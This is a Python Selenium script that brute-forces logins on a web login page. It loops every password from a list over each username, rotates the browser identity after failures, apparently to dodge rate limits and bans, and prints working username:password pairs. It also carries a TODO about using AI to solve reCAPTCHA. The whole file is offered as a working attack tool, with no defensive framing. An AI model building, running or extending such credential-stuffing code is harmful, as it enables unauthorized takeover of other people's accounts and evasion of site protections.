from typing import List

from selenium.common import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

from SeleniumManager import SeleniumManager

LOGIN_PAGE = "https://example.com/login.html"


class Login:
    @staticmethod
    def login_bot(bot: SeleniumManager, username, password):
        try:
            # Navigate to the login page
            bot.driver.get(LOGIN_PAGE)
            # Wait for the login form to load
            bot.wait_for_element('//*[@id="loginForm"]')

            # Click on the reject button of cookie notification
            Login.click_reject(bot)

            # Fill in the login form with your credentials
            name_input = bot.driver.find_element(By.NAME, 'name')
            name_input.clear()
            name_input.send_keys(username)

            password_input = bot.driver.find_element(By.NAME, 'password')
            password_input.clear()
            password_input.send_keys(password)

            # Submit the login form by clicking the login button
            login_button = bot.driver.find_elements(By.XPATH, '//button[@type="submit"]')[0]
            login_button.click()

        except:
            bot.new_identity()
            Login.login_bot(bot, username, password)

    @staticmethod
    def click_reject(bot: SeleniumManager):
        try:
            reject_button = bot.driver.find_element(By.ID, 'cmpwelcomebtnno')
            reject_button.click()
        except NoSuchElementException:
            pass
        finally:
            print("--------loading...")

    @staticmethod
    def recaptcha_solver():
        pass
        # TODO : We are in the year of the AI. I think some AI's can do the recaptcha solve.

    @staticmethod
    def login_all_users(bot: SeleniumManager, usernames: List[str], passwords):
        for username in usernames:
            for password in passwords:
                print("Trying to login : ", username, ":", password)
                Login.login_bot(bot, username, password)
                verification = Login.login_verification(bot, username, password)
                if verification:
                    break
            bot.new_identity()
            bot.refresh_identity()

    @staticmethod
    def login_verification(bot, username, password):
        try:
            wait = WebDriverWait(bot.driver, 3)
            error_text = 'The password is wrong.'
            wait.until(EC.text_to_be_present_in_element(
                (By.XPATH, '//*[contains(@id, "error") and contains(@class, "error")]'), error_text))

            print("incorrect user:pw: ", username + ":", password)
            return False

        except:
            if not bot.has_recaptcha():
                try:
                    wait = WebDriverWait(bot.driver, 3)
                    error_text2 = "Login does not exist." \
                                  " Are you sure that you play on .com and not e.g. on .us or .co.uk?"
                    # if password is wrong on login page, write error text here.
                    wait.until(EC.text_to_be_present_in_element(
                        (By.XPATH, '//*[contains(@id, "error") and contains(@class, "error")]'), error_text2))
                    print("There is no such as account... ", username, ":", password)
                    return True
                    # actually verification value need to be false but bot don't need to try again just forgot this
                    # account.
                except:
                    print("Login successful!!! user:pw: ", username + ":", password)
                    return True
            else:
                return True
